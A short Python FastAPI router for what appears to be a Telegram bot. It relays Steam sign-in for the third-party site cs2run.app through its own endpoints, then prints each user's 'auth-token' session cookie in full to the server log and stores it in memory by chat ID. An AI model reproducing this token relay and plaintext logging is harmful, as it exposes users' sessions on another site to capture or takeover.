from fastapi import APIRouter, Request, Query
from fastapi.responses import RedirectResponse, HTMLResponse
import urllib.parse

router = APIRouter()

SELF_URL = "https://tg-bot-test-gkbp.onrender.com"
RAM_DATA = {}


@router.get("/auth/login")
async def auth_login(chat_id: int = Query(...)):
    return_url = f"{SELF_URL}/auth/steam?chat_id={chat_id}"
    return RedirectResponse(
        f"https://cs2run.app/auth/1/get-url/?return_url={urllib.parse.quote(return_url)}"
    )


@router.get("/auth/steam")
async def auth_steam(request: Request, chat_id: int):
    # Это ТОЧКА, куда Steam возвращает пользователя
    query = request.url.query

    final_return = f"{SELF_URL}/auth/final?chat_id={chat_id}"
    final_return = urllib.parse.quote(final_return)

    redirect_url = (
        f"https://cs2run.app/auth/1/start-sign-in/"
        f"?{query}&returnUrl={final_return}"
    )

    return RedirectResponse(redirect_url)


@router.get("/auth/final")
async def auth_final(request: Request, chat_id: int):
    auth_token = request.cookies.get("auth-token")

    if not auth_token:
        return HTMLResponse("<h2>Ошибка: auth-token не получен</h2>")

    print(f"\n🔥 [SUCCESS] Chat {chat_id} auth-token:\n{auth_token}\n")

    RAM_DATA[chat_id] = {"auth_token": auth_token}

    return HTMLResponse("<h2>Готово. Авторизация завершена.</h2>")